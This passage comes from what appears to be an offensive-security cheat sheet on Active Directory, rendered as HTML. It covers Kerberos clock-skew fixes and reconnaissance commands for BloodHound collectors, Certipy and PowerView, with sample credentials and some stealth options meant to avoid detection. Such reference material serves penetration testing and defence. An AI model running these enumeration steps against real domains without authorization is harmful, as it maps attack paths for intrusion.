<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nb">Add-LabMachineDefinition</span> <span class="n">-Name</span> <span class="n">FirstServer</span> <span class="n">-OperatingSystem</span> <span class="s1">&#39;Windows Server 2016 SERVERSTANDARD&#39;</span>
<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="nb">Install-Lab</span>
<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="nb">Show-LabDeploymentSummary</span>
</code></pre></div></p>
</li>
</ul>
<h2 id="kerberos-clock-synchronization">Kerberos Clock Synchronization</h2>
<p>In Kerberos, time is used to ensure that tickets are valid. To achieve this, the clocks of all Kerberos clients and servers in a realm must be synchronized to within a certain tolerance. The default clock skew tolerance in Kerberos is <code>5 minutes</code>, which means that the difference in time between the clocks of any two Kerberos entities should be no more than 5 minutes.</p>
<ul>
<li>Detect clock skew automatically with <code>nmap</code>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="p">$</span> <span class="n">nmap</span> <span class="n">-sV</span> <span class="n">-sC</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="n">clock-skew</span><span class="p">:</span> <span class="n">mean</span><span class="p">:</span> <span class="p">-</span><span class="n">1998d09h03m04s</span><span class="p">,</span> <span class="n">deviation</span><span class="p">:</span> <span class="n">4h00m00s</span><span class="p">,</span> <span class="n">median</span><span class="p">:</span> <span class="p">-</span><span class="n">1998d11h03m05s</span>
</code></pre></div></li>
<li>Compute yourself the difference between the clocks
  <div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">nmap</span> <span class="n">-sT</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-p445</span> <span class="p">-</span><span class="n">-script</span> <span class="n">smb2-time</span> <span class="n">-vv</span>
</code></pre></div></li>
<li>Fix #1: Modify your clock
  <div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">sudo</span> <span class="n">date</span> <span class="n">-s</span> <span class="s2">&quot;14 APR 2015 18:25:16&quot;</span> <span class="c"># Linux</span>
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">net</span> <span class="n">time</span> <span class="p">/</span><span class="n">domain</span> <span class="p">/</span><span class="nb">set </span><span class="c"># Windows</span>
</code></pre></div></li>
<li>Fix #2: Fake your clock
  <div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">faketime</span> <span class="o">-f</span> <span class="s1">&#39;+8h&#39;</span> <span class="n">date</span>
</code></pre></div></li>
</ul>
<h2 id="active-directory-recon">Active Directory Recon</h2>
<h3 id="using-bloodhound">Using BloodHound</h3>
<p>Use the correct collector
* AzureHound for Azure Active Directory
* SharpHound for local Active Directory
* RustHound for local Active Directory</p>
<ul>
<li>
<p>use <a href="https://github.com/BloodHoundAD/AzureHound">BloodHoundAD/AzureHound</a> (more info: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md#azure-recon-tools">Cloud - Azure Pentest</a>)</p>
</li>
<li>
<p>use <a href="https://github.com/BloodHoundAD/BloodHound">BloodHoundAD/BloodHound</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c"># run the collector on the machine using SharpHound.exe</span>
<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="c"># https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe</span>
<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="c"># /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe</span>
<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">all</span> <span class="n">-d</span> <span class="n">active</span><span class="p">.</span><span class="n">htb</span> <span class="p">-</span><span class="n">-searchforest</span>
<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">all</span><span class="p">,</span><span class="n">GPOLocalGroup</span> <span class="c"># all collection doesn&#39;t include GPOLocalGroup by default</span>
<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-CollectionMethod</span> <span class="n">DCOnly</span> <span class="c"># only collect from the DC, doesn&#39;t query the computers (more stealthy)</span>
<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>
<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">all</span> <span class="p">-</span><span class="n">-LdapUsername</span> <span class="p">&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-LdapPassword</span> <span class="p">&lt;</span><span class="n">Password</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-JSONFolder</span> <span class="p">&lt;</span><span class="n">PathToFile</span><span class="p">&gt;</span>
<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">all</span> <span class="p">-</span><span class="n">-LdapUsername</span> <span class="p">&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-LdapPassword</span> <span class="p">&lt;</span><span class="n">Password</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-domaincontroller</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">100</span> <span class="n">-d</span> <span class="n">active</span><span class="p">.</span><span class="n">htb</span>
<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="n">all</span><span class="p">,</span><span class="n">GPOLocalGroup</span> <span class="p">-</span><span class="n">-outputdirectory</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span> <span class="p">-</span><span class="n">-randomizefilenames</span> <span class="p">-</span><span class="n">-prettyjson</span> <span class="p">-</span><span class="n">-nosavecache</span> <span class="p">-</span><span class="n">-encryptzip</span> <span class="p">-</span><span class="n">-collectallproperties</span> <span class="p">-</span><span class="n">-throttle</span> <span class="n">10000</span> <span class="p">-</span><span class="n">-jitter</span> <span class="n">23</span>
<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>
<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="c"># or run the collector on the machine using Powershell</span>
<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="c"># https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1</span>
<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="c"># /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1</span>
<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="nb">Invoke-BloodHound</span> <span class="n">-SearchForest</span> <span class="n">-CSVFolder</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span>
<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a><span class="nb">Invoke-BloodHound</span> <span class="n">-CollectionMethod</span> <span class="n">All</span>  <span class="n">-LDAPUser</span> <span class="p">&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="n">-LDAPPass</span> <span class="p">&lt;</span><span class="n">Password</span><span class="p">&gt;</span> <span class="n">-OutputDirectory</span> <span class="p">&lt;</span><span class="n">PathToFile</span><span class="p">&gt;</span>
<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>
<a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a><span class="c"># or remotely via BloodHound Python</span>
<a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a><span class="c"># https://github.com/fox-it/BloodHound.py</span>
<a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a><span class="n">pip</span> <span class="n">install</span> <span class="n">bloodhound</span>
<a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a><span class="n">bloodhound-python</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-u</span> <span class="n">rsmith</span> <span class="n">-p</span> <span class="n">Winter2017</span> <span class="n">-gc</span> <span class="n">LAB2008DC01</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-c</span> <span class="n">all</span>
<a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a>
<a id="__codelineno-12-23" name="__codelineno-12-23" href="#__codelineno-12-23"></a><span class="c"># or locally/remotely from an ADExplorer snapshot from SysInternals (ADExplorer remains a legitimate binary signed by Microsoft, avoiding detection with security solutions)</span>
<a id="__codelineno-12-24" name="__codelineno-12-24" href="#__codelineno-12-24"></a><span class="c"># https://github.com/c3c/ADExplorerSnapshot.py</span>
<a id="__codelineno-12-25" name="__codelineno-12-25" href="#__codelineno-12-25"></a><span class="n">pip3</span> <span class="n">install</span> <span class="p">-</span><span class="n">-user</span> <span class="p">.</span>
<a id="__codelineno-12-26" name="__codelineno-12-26" href="#__codelineno-12-26"></a><span class="n">ADExplorerSnapshot</span><span class="p">.</span><span class="n">py</span> <span class="p">&lt;</span><span class="n">snapshot</span> <span class="n">path</span><span class="p">&gt;</span> <span class="n">-o</span> <span class="p">&lt;*.</span><span class="n">json</span> <span class="n">output</span> <span class="n">folder</span> <span class="n">path</span><span class="p">&gt;</span>
</code></pre></div></p>
</li>
<li>Collect more data for certificates exploitation using Certipy
  <div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">certipy</span> <span class="n">find</span> <span class="s1">&#39;corp.local/john:Passw0rd@dc.corp.local&#39;</span> <span class="n">-bloodhound</span>
<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="n">certipy</span> <span class="n">find</span> <span class="s1">&#39;corp.local/john:Passw0rd@dc.corp.local&#39;</span> <span class="n">-old-bloodhound</span>
<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="n">certipy</span> <span class="n">find</span> <span class="s1">&#39;corp.local/john:Passw0rd@dc.corp.local&#39;</span> <span class="n">-vulnerable</span> <span class="n">-hide-admins</span> <span class="n">-username</span> <span class="n">user</span><span class="nv">@domain</span> <span class="n">-password</span> <span class="n">Password123</span>
</code></pre></div></li>
<li>use <a href="https://github.com/OPENCYBER-FR/RustHound">OPENCYBER-FR/RustHound</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c"># Windows with GSSAPI session</span>
<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="n">rusthound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-d</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-ldapfqdn</span> <span class="n">domain</span>
<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="c"># Windows/Linux simple bind connection username:password</span>
<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="n">rusthound</span><span class="p">.</span><span class="n">exe</span> <span class="n">-d</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="n">-u</span> <span class="n">user</span><span class="nv">@domain</span><span class="p">.</span><span class="n">local</span> <span class="n">-p</span> <span class="n">Password123</span> <span class="n">-o</span> <span class="n">output</span> <span class="n">-z</span>
<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="c"># Linux with username:password and ADCS module for @ly4k BloodHound version</span>
<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="n">rusthound</span> <span class="n">-d</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="n">-u</span> <span class="s1">&#39;user@domain.local&#39;</span> <span class="n">-p</span> <span class="s1">&#39;Password123&#39;</span> <span class="n">-o</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">adcs</span> <span class="p">-</span><span class="n">-adcs</span> <span class="n">-z</span>
</code></pre></div></li>
</ul>
<p>Then import the zip/json files into the Neo4J database and query them.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">root</span><span class="nv">@payload</span><span class="p">$</span> <span class="n">apt</span> <span class="n">install</span> <span class="n">bloodhound</span> 
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="c"># start BloodHound and the database</span>
<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="n">root</span><span class="nv">@payload</span><span class="p">$</span> <span class="n">neo4j</span> <span class="n">console</span>
<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="c"># or use docker</span>
<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="n">root</span><span class="nv">@payload</span><span class="p">$</span> <span class="n">docker</span> <span class="n">run</span> <span class="n">-p7474</span><span class="p">:</span><span class="n">7474</span> <span class="n">-p7687</span><span class="p">:</span><span class="n">7687</span> <span class="n">-e</span> <span class="n">NEO4J_AUTH</span><span class="p">=</span><span class="n">neo4j</span><span class="p">/</span><span class="n">bloodhound</span> <span class="n">neo4j</span>
<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>
<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="n">root</span><span class="nv">@payload</span><span class="p">$</span> <span class="p">./</span><span class="n">bloodhound</span> <span class="p">-</span><span class="n">-no-sandbox</span>
<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="n">Go</span> <span class="n">to</span> <span class="n">http</span><span class="p">://</span><span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">7474</span><span class="p">,</span> <span class="n">use</span> <span class="n">db</span><span class="p">:</span><span class="n">bolt</span><span class="p">://</span><span class="n">localhost</span><span class="p">:</span><span class="n">7687</span><span class="p">,</span> <span class="n">user</span><span class="p">:</span><span class="n">neo4J</span><span class="p">,</span> <span class="n">pass</span><span class="p">:</span><span class="n">neo4j</span>
</code></pre></div>
<p>You can add some custom queries like :
* <a href="https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json">Bloodhound-Custom-Queries from @hausec</a>
* <a href="https://github.com/CompassSecurity/BloodHoundQueries/blob/master/customqueries.json">BloodHoundQueries from CompassSecurity</a>
* <a href="https://raw.githubusercontent.com/ShutdownRepo/Exegol/master/sources/bloodhound/customqueries.json">BloodHound Custom Queries from Exegol - @ShutdownRepo</a>
* <a href="https://github.com/ly4k/Certipy/blob/main/customqueries.json">Certipy BloodHound Custom Queries from ly4k</a></p>
<p>Replace the customqueries.json file located at <code>/home/username/.config/bloodhound/customqueries.json</code> or <code>C:\Users\USERNAME\AppData\Roaming\BloodHound\customqueries.json</code>.</p>
<h3 id="using-powerview">Using PowerView</h3>
<ul>
<li><strong>Get Current Domain:</strong> <code>Get-NetDomain</code></li>
<li><strong>Enum Other Domains:</strong> <code>Get-NetDomain -Domain &lt;DomainName&gt;</code></li>
<li><strong>Get Domain SID:</strong> <code>Get-DomainSID</code></li>
<li><strong>Get Domain Policy:</strong> 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="nb">Get-DomainPolicy</span>
<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="c">#Will show us the policy configurations of the Domain about system access or kerberos</span>
<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="p">(</span><span class="nb">Get-DomainPolicy</span><span class="p">).</span><span class="s2">&quot;system access&quot;</span>
<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="p">(</span><span class="nb">Get-DomainPolicy</span><span class="p">).</span><span class="s2">&quot;kerberos policy&quot;</span>
</code></pre></div></li>
<li><strong>Get Domain Controlers:</strong> 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nb">Get-NetDomainController</span>
<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="nb">Get-NetDomainController</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span>
</code></pre></div></li>
<li><strong>Enumerate Domain Users:</strong> 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nb">Get-NetUser</span>
<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="nb">Get-NetUser</span> <span class="n">-SamAccountName</span> <span class="p">&lt;</span><span class="n">user</span><span class="p">&gt;</span> 
<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="nb">Get-NetUser</span> <span class="p">|</span> <span class="nb">select </span><span class="n">cn</span>
<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="nb">Get-UserProperty</span>
<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>
<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="c">#Check last password change</span>
<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="nb">Get-UserProperty</span> <span class="n">-Properties</span> <span class="n">pwdlastset</span>
<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>
<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="c">#Get a spesific &quot;string&quot; on a user&#39;s attribute</span>
<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="nb">Find-UserField</span> <span class="n">-SearchField</span> <span class="n">Description</span> <span class="n">-SearchTerm</span> <span class="s2">&quot;wtver&quot;</span>
<a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>
<a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a><span class="c">#Enumerate user logged on a machine</span>
<a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a><span class="nb">Get-NetLoggedon</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">ComputerName</span><span class="p">&gt;</span>
<a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a>
<a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a><span class="c">#Enumerate Session Information for a machine</span>
<a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a><span class="nb">Get-NetSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">ComputerName</span><span class="p">&gt;</span>
<a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a>
<a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a><span class="c">#Enumerate domain machines of the current/specified domain where specific users are logged into</span>
<a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a><span class="nb">Find-DomainUserLocation</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">UserName</span><span class="p">,</span> <span class="n">SessionFromName</span>
</code></pre></div></li>
<li><strong>Enum Domain Computers:</strong> 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="nb">Get-NetComputer</span> <span class="n">-FullData</span>
<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="nb">Get-DomainGroup</span>
<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="c">#Enumerate Live machines </span>
<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="nb">Get-NetComputer</span> <span class="n">-Ping</span>
</code></pre></div></li>
<li><strong>Enum Groups and Group Members:</strong>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nb">Get-NetGroupMember</span> <span class="n">-GroupName</span> <span class="s2">&quot;&lt;GroupName&gt;&quot;</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span>
<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>
<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="c">#Enumerate the members of a specified group of the domain</span>
<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="nb">Get-DomainGroup</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">GroupName</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">Member</span>
<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>
<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="c">#Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences</span>
<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="nb">Get-DomainGPOLocalGroup</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">GPODisplayName</span><span class="p">,</span> <span class="n">GroupName</span>
</code></pre></div></li>
<li><strong>Enumerate Shares</strong>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c">#Enumerate Domain Shares</span>
<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="nb">Find-DomainShare</span>
<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="c">#Enumerate Domain Shares the current user has access</span>
<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="nb">Find-DomainShare</span> <span class="n">-CheckShareAccess</span>
</code></pre></div></li>
<li><strong>Enum Group Policies:</strong> 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nb">Get-NetGPO</span>
<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>
<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="c"># Shows active Policy on specified machine</span>
<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="nb">Get-NetGPO</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">Name</span> <span class="n">of</span> <span class="n">the</span> <span class="n">PC</span><span class="p">&gt;</span>
<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="nb">Get-NetGPOGroup</span>
<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>
<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="c">#Get users that are part of a Machine&#39;s local Admin group</span>
<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="nb">Find-GPOComputerAdmin</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">ComputerName</span><span class="p">&gt;</span>
</code></pre></div></li>
<li><strong>Enum OUs:</strong> 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="nb">Get-NetOU</span> <span class="n">-FullData</span> 
<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="nb">Get-NetGPO</span> <span class="n">-GPOname</span> <span class="p">&lt;</span><span class="n">The</span> <span class="n">GUID</span> <span class="n">of</span> <span class="n">the</span> <span class="n">GPO</span><span class="p">&gt;</span>
</code></pre></div></li>
<li><strong>Enum ACLs:</strong> 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c"># Returns the ACLs associated with the specified account</span>
<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="nb">Get-ObjectAcl</span> <span class="n">-SamAccountName</span> <span class="p">&lt;</span><span class="n">AccountName</span><span class="p">&gt;</span> <span class="n">-ResolveGUIDs</span>
<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="nb">Get-ObjectAcl</span> <span class="n">-ADSprefix</span> <span class="s1">&#39;CN=Administrator, CN=Users&#39;</span> <span class="n">-Verbose</span>
<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>
<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="c">#Search for interesting ACEs</span>
<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="nb">Invoke-ACLScanner</span> <span class="n">-ResolveGUIDs</span>
<a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>
<a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="c">#Check the ACLs associated with a specified path (e.g smb share)</span>
<a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="nb">Get-PathAcl</span> <span class="n">-Path</span> <span class="s2">&quot;\\Path\Of\A\Share&quot;</span>
</code></pre></div></li>
<li><strong>Enum Domain Trust:</strong> 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="nb">Get-NetDomainTrust</span>
<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="nb">Get-NetDomainTrust</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span>
</code></pre></div></li>
<li><strong>Enum Forest Trust:</strong> 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="nb">Get-NetForestDomain</span>
<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="nb">Get-NetForestDomain</span> <span class="n">Forest</span> <span class="p">&lt;</span><span class="n">ForestName</span><span class="p">&gt;</span>
<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>
<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="c">#Domains of Forest Enumeration</span>
<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="nb">Get-NetForestDomain</span>
<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a><span class="nb">Get-NetForestDomain</span> <span class="n">Forest</span> <span class="p">&lt;</span><span class="n">ForestName</span><span class="p">&gt;</span>
<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>
<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="c">#Map the Trust of the Forest</span>
<a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a><span class="nb">Get-NetForestTrust</span>
<a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a><span class="nb">Get-NetDomainTrust</span> <span class="n">-Forest</span> <span class="p">&lt;</span><span class="n">ForestName</span><span class="p">&gt;</span>
</code></pre></div></li>
<li><strong>User Hunting:</strong> 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="c">#Finds all machines on the current domain where the current user has local admin access</span>
